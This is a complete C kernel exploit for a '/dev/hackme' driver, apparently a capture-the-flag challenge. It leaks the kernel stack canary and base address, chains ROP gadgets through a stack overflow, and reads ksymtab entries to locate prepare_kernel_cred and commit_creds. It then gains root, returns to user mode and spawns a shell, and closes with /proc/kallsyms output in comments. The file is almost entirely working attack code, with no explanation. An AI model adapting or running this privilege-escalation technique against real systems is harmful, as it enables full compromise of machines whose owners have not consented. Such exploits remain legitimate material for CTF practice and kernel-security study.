#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <signal.h>

int g_fd = 0;

uint64_t g_canary;
uint64_t g_img_base;

uint64_t pop_rdi_ret;
uint64_t iretq;
uint64_t swapgs_restore_regs_and_ret_to_usermode;
uint64_t pop_rsi_pop1_ret;

// 0xffffffff81004d11 : pop rax ; ret
uint64_t pop_rax_ret;

// 0xffffffff81015a80 : mov eax, dword ptr [rax] ; pop rbp ; ret
uint64_t mov_eax_dword_rax_pop1_ret;

uint64_t ksymtab;
uint64_t ksymtab_prepare_kernel_cred;
uint64_t ksymtab_commit_creds;

uint64_t prepare_kernel_cred;
uint64_t commit_creds;

void leak() {
    uint64_t buf[50] = {0};
    read(g_fd, buf, sizeof(buf));
    g_canary = buf[16];
    g_img_base = buf[38] - 0xa157;

    pop_rdi_ret = g_img_base + 0x6370;
    iretq = g_img_base + 0xc0d9;
    swapgs_restore_regs_and_ret_to_usermode = g_img_base + 0x200f10 + 22;
    pop_rsi_pop1_ret = g_img_base + 0x423;
    pop_rax_ret = g_img_base + 0x4d11;
    mov_eax_dword_rax_pop1_ret = g_img_base + 0x15a80;

    ksymtab = g_img_base + 0xf85198;
    ksymtab_prepare_kernel_cred = ksymtab + 0x8364;
    ksymtab_commit_creds = ksymtab + 0x2bf8;

    printf("[*] Kernel's canary=%#lx\n", g_canary);
    printf("[*] Kernel's .text@%#lx\n", g_img_base);
    printf("[*] ksymtab@%#lx\n", ksymtab);
    printf("[*] ksymtab_prepare_kernel_cred@%#lx\n", ksymtab_prepare_kernel_cred);
    printf("[*] ksymtab_commit_creds@%#lx\n", ksymtab_commit_creds);
}

uint64_t user_ss, user_cs, user_sp, user_rflags;

void save_state() {
    __asm__ (
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] State Saved");
}

void get_shell() {
    if (0 != getuid()) {
        puts("[x] Not in root privilege.");
        exit(-1);
    } else {
        puts("[-] Success!!");
        system("/bin/sh");
    }
}

void overflow_read(uint64_t addr_to_read, uint64_t user_ret_addr) {
    uint64_t buf[50] = {0};
    size_t off = 16;

    buf[off++] = g_canary;
    buf[off++] = 0; // rbx
    buf[off++] = 0; // r12
    buf[off++] = 0; // rbp
    buf[off++] = pop_rax_ret;
    buf[off++] = addr_to_read;
    buf[off++] = mov_eax_dword_rax_pop1_ret;
    buf[off++] = 0;
    buf[off++] = swapgs_restore_regs_and_ret_to_usermode;
    buf[off++] = 0; // dummy rax
    buf[off++] = 0; // dummy rdi
    buf[off++] = user_ret_addr;
    buf[off++] = user_cs;
    buf[off++] = user_rflags;
    buf[off++] = user_sp;
    buf[off++] = user_ss;

    printf("[*] %s: Prepared payload.\n", __FUNCTION__);
    write(g_fd, buf, sizeof(buf));
    puts("[!] Should never reach here!");
}

uint64_t g_tmp_rax;

void call_commit_creds() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov g_tmp_rax, rax;"
        ".att_syntax;"
    );

    uint64_t buf[50] = {0};
    size_t off = 16;

    buf[off++] = g_canary;
    buf[off++] = 0; // rbx
    buf[off++] = 0; // r12
    buf[off++] = 0; // rbp
    buf[off++] = pop_rdi_ret;
    buf[off++] = g_tmp_rax;
    buf[off++] = commit_creds;
    buf[off++] = swapgs_restore_regs_and_ret_to_usermode;
    buf[off++] = 0; // dummy rax
    buf[off++] = 0; // dummy rdi
    buf[off++] = (uint64_t)get_shell;
    buf[off++] = user_cs;
    buf[off++] = user_rflags;
    buf[off++] = user_sp;
    buf[off++] = user_ss;

    printf("[*] %s: Prepared payload.\n", __FUNCTION__);
    write(g_fd, buf, sizeof(buf));
}

void call_prepare_kernel_cred() {
    uint64_t buf[50] = {0};
    size_t off = 16;

    buf[off++] = g_canary;
    buf[off++] = 0; // rbx
    buf[off++] = 0; // r12
    buf[off++] = 0; // rbp
    buf[off++] = pop_rdi_ret;
    buf[off++] = 0;
    buf[off++] = prepare_kernel_cred;
    buf[off++] = swapgs_restore_regs_and_ret_to_usermode;
    buf[off++] = 0; // dummy rax
    buf[off++] = 0; // dummy rdi
    buf[off++] = (uint64_t)call_commit_creds;
    buf[off++] = user_cs;
    buf[off++] = user_rflags;
    buf[off++] = user_sp;
    buf[off++] = user_ss;

    printf("[*] %s: Prepared payload.\n", __FUNCTION__);
    write(g_fd, buf, sizeof(buf));
}

void leak_commit_creds() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov g_tmp_rax, rax;"
        ".att_syntax;"
    );
    commit_creds = ksymtab_commit_creds + (int)g_tmp_rax;
    printf("[*] commit_creds@%#lx\n", commit_creds);
    call_prepare_kernel_cred();
}

void leak_prepare_kernel_cred() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov g_tmp_rax, rax;"
        ".att_syntax;"
    );
    prepare_kernel_cred = ksymtab_prepare_kernel_cred + (int)g_tmp_rax;
    printf("[*] prepare_kernel_cred@%#lx\n", prepare_kernel_cred);
    overflow_read(ksymtab_commit_creds, (uint64_t)leak_commit_creds);
}

int main(int argc, char** argv) {
    // if KPTI enabled, return to user-mode without switching page table will case
    // Segment fault. Set a SIGSEGV handler to get shell is the easiest way.
    // signal(SIGSEGV, get_shell);

    g_fd = open("/dev/hackme", O_RDWR);
    if (g_fd < 0) {
        perror("open failed.");
        exit(-1);
    }
    save_state();
    leak();
    overflow_read(ksymtab_prepare_kernel_cred, (uint64_t)leak_prepare_kernel_cred);
    return 0;
}

// / # cat /proc/kallsyms |grep "_stext"
// ffffffffaa600000 T _stext
// / # cat /proc/kallsyms |grep prepare_kernel
// ffffffffaaa23360 T prepare_kernel_cred
// ffffffffab58d4fc r __ksymtab_prepare_kernel_cred
// ffffffffab5a09b2 r __kstrtab_prepare_kernel_cred
// ffffffffab5a4d42 r __kstrtabns_prepare_kernel_cred
// / # cat /proc/kallsyms |grep commit_creds
// ffffffffaaee2af0 T commit_creds
// ffffffffab587d90 r __ksymtab_commit_creds
// ffffffffab5a0972 r __kstrtab_commit_creds
// ffffffffab5a4d42 r __kstrtabns_commit_creds
// / # cat /proc/kallsyms |grep hackme_
// ffffffffc01040d0 t hackme_release       [hackme]
// ffffffffc01040e0 t hackme_write [hackme]
// ffffffffc01040c0 t hackme_open  [hackme]
// ffffffffc0104000 t hackme_read  [hackme]
// ffffffffc0106000 d hackme_misc  [hackme]
// ffffffffc0104197 t hackme_exit  [hackme]
// ffffffffc01050a0 r hackme_fops  [hackme]
// ffffffffc0106440 b hackme_buf   [hackme]